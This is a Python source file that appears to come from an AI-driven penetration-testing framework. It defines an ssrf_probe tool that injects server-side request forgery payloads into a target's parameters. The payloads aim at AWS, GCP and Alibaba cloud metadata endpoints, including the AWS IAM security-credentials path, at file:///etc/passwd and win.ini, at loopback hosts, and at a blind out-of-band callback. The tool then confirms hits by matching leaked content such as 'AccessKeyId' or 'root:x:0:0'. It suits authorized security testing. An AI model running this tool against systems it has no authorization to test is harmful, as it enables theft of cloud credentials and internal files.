"""Deep SSRF probing per parameter — cloud metadata, file://, internal, blind OAST.

``injection_fuzz`` sends a single blind-OAST callback per param. This goes deep on
the one class where that isn't enough: it aims each SSRF-prone parameter at cloud
metadata endpoints and ``file://`` (confirmed by response content signatures, not
just reflection), at internal/loopback hosts (flagged by baseline-diff), and — if
given an OAST domain — at a blind callback URL. A per-param baseline suppresses
reflection false positives so a hit means the server actually fetched it.
"""

from __future__ import annotations

import asyncio
import json
from typing import Any

from agents import RunContextWrapper, function_tool

from strix.tools.injection_fuzz.tools import _inject


# (label, payload URL, (content signatures proving the server fetched it, ...))
_METADATA_TARGETS: tuple[tuple[str, str, tuple[str, ...]], ...] = (
    (
        "aws-imds",
        "http://169.254.169.254/latest/meta-data/",
        ("ami-id", "instance-id", "iam/", "security-credentials", "public-keys/"),
    ),
    (
        "aws-imds-creds",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ("AccessKeyId", "SecretAccessKey", "Token"),
    ),
    (
        "gcp-metadata",
        "http://metadata.google.internal/computeMetadata/v1/",
        ("computeMetadata", "project/", "instance/"),
    ),
    (
        "alibaba-metadata",
        "http://100.100.100.200/latest/meta-data/",
        ("instance-id", "image-id", "region-id"),
    ),
)
_FILE_TARGETS: tuple[tuple[str, str, tuple[str, ...]], ...] = (
    ("file-etc-passwd", "file:///etc/passwd", ("root:x:0:0", "daemon:x:", "/bin/")),
    ("file-win-ini", "file:///c:/windows/win.ini", ("[fonts]", "[extensions]", "for 16-bit")),
)
# Reserved/unroutable host: connecting to it should fail, giving a "server did
# not fetch" baseline to diff internal-host responses against.
_BOGUS_HOST = "http://240.0.0.1/"
_INTERNAL_TARGETS: tuple[tuple[str, str], ...] = (
    ("loopback-v4", "http://127.0.0.1/"),
    ("loopback-name", "http://localhost/"),
    ("loopback-v6", "http://[::1]/"),
    ("link-local", "http://169.254.169.254/"),
)
_BENIGN = "https://example.com/"
_MAX_PARAMS = 10


def _sig_hit(body: str, base_body: str, payload: str, sigs: tuple[str, ...]) -> str | None:
    """A signature present in the payload response but NOT in the param's baseline
    AND NOT in the payload URL itself — i.e. genuine content the server fetched,
    not the echoed request URL (which contains parts of the target path)."""
    for sig in sigs:
        if sig in body and sig not in base_body and sig not in payload:
            return sig
    return None


def _probe_param(
    method: str,
    url: str,
    name: str,
    headers: dict[str, str] | None,
    body: str | None,
    point: str,
    oast_domain: str | None,
    timeout: int,
) -> list[dict[str, Any]]:
    findings: list[dict[str, Any]] = []

    base = _inject(method, url, name, _BENIGN, headers, body, point, timeout)
    base_body = base.get("body") or "" if base.get("success") else ""

    for label, payload, sigs in (*_METADATA_TARGETS, *_FILE_TARGETS):
        resp = _inject(method, url, name, payload, headers, body, point, timeout)
        if not resp.get("success"):
            continue
        hit = _sig_hit(resp.get("body") or "", base_body, payload, sigs)
        if hit:
            findings.append(
                {
                    "param": name,
                    "family": "ssrf",
                    "target": label,
                    "payload": payload,
                    "severity": "critical",
                    "evidence": f"server fetched {label}: response contains {hit!r}",
                }
            )

    # Internal/loopback: diff against an unroutable bogus host. A materially
    # different, successful response for a private host suggests the server
    # reached it — a candidate to confirm, not a confirmed leak.
    bogus = _inject(method, url, name, _BOGUS_HOST, headers, body, point, timeout)
    bogus_key = (bogus.get("status_code"), len(bogus.get("body") or ""))
    for label, payload in _INTERNAL_TARGETS:
        resp = _inject(method, url, name, payload, headers, body, point, timeout)
        if not resp.get("success"):
            continue
        key = (resp.get("status_code"), len(resp.get("body") or ""))
        status = resp.get("status_code") or 0
        if key != bogus_key and 200 <= status < 500:
            findings.append(
                {
                    "param": name,
                    "family": "ssrf",
                    "target": label,
                    "payload": payload,
                    "severity": "unconfirmed",
                    "evidence": (
                        f"{label} response differs from an unroutable-host baseline "
                        f"(status {status}, {key[1]} bytes vs {bogus_key[1]}) — the server "
                        "may have reached an internal host; confirm with OAST or content"
                    ),
                }
            )

    if oast_domain:
        callback = f"http://{name}.{oast_domain}/"
        _inject(method, url, name, callback, headers, body, point, timeout)
        findings.append(
            {
                "param": name,
                "family": "ssrf",
                "target": "blind-oast",
                "payload": callback,
                "severity": "unconfirmed",
                "evidence": (
                    f"blind SSRF callback sent — call oast_poll; a DNS/HTTP hit on "
                    f"{name}.{oast_domain} confirms it"
                ),
            }
        )
    return findings


def _ssrf_probe_impl(
    method: str,
    url: str,
    params: list[str],
    headers: dict[str, str] | None,
    body: str | None,
    injection_point: str,
    oast_domain: str | None,
    timeout: int,
) -> dict[str, Any]:
    if not url or not url.strip():
        return {"success": False, "error": "url cannot be empty"}
    if not params:
        return {"success": False, "error": "params cannot be empty (SSRF-prone param names)"}
    point = "body" if injection_point == "body" else "query"
    findings: list[dict[str, Any]] = []
    for name in params[:_MAX_PARAMS]:
        findings.extend(
            _probe_param(method, url, name, headers, body, point, oast_domain, timeout)
        )
    confirmed = [f for f in findings if f["severity"] != "unconfirmed"]
    return {
        "success": True,
        "url": url,
        "params_tested": len(params[:_MAX_PARAMS]),
        "finding_count": len(confirmed),
        "possible_ssrf": bool(confirmed),
        "findings": findings,
    }


@function_tool(timeout=600, strict_mode=False)
async def ssrf_probe(
    ctx: RunContextWrapper,
    url: str,
    params: list[str],
    method: str = "GET",
    headers: dict[str, str] | None = None,
    body: str | None = None,
    injection_point: str = "query",
    oast_domain: str | None = None,
    timeout: int = 12,
) -> str:
    """Deep SSRF test each parameter — metadata, file://, internal, blind OAST.

    Where ``injection_fuzz`` sends one blind-OAST payload, this drives the full
    SSRF class per parameter: cloud metadata (AWS IMDS incl. IAM creds, GCP,
    Alibaba) and ``file://`` — **confirmed by response content signatures**
    (``root:x:0:0``, ``iam/security-credentials``, …), so a ``critical`` hit
    means the server actually fetched it, not merely reflected the URL; plus
    internal/loopback hosts flagged by diffing against an unroutable-host
    baseline (``unconfirmed`` candidates); plus, with ``oast_domain``, a blind
    DNS/HTTP callback to poll. A per-param baseline suppresses reflection false
    positives. Only test authorized targets.

    Common SSRF-prone param names to pass: ``url``, ``uri``, ``link``, ``src``,
    ``image``, ``img``, ``file``, ``path``, ``dest``, ``redirect``, ``next``,
    ``target``, ``webhook``, ``callback``, ``feed``, ``proxy``, ``host``.

    Returns JSON with ``possible_ssrf``, ``finding_count`` (confirmed only), and
    ``findings`` (param/family/target/payload/severity/evidence). ``unconfirmed``
    findings are candidates — confirm via ``oast_poll`` or returned content.

    Args:
        url: Endpoint whose parameter may fetch a URL server-side.
        params: SSRF-prone parameter names to test (max 10).
        method: HTTP method (default GET).
        headers: Request headers (send session headers if the sink is authed).
        body: Raw body — required when ``injection_point`` is ``body``.
        injection_point: ``query`` (default) or ``body`` (JSON body param).
        oast_domain: An ``oast_get_domain`` host for the blind callback.
        timeout: Per-request timeout in seconds (default 12).
    """
    del ctx
    return json.dumps(
        await asyncio.to_thread(
            _ssrf_probe_impl,
            method,
            url,
            params,
            headers,
            body,
            injection_point,
            oast_domain,
            timeout,
        ),
        ensure_ascii=False,
        default=str,
    )
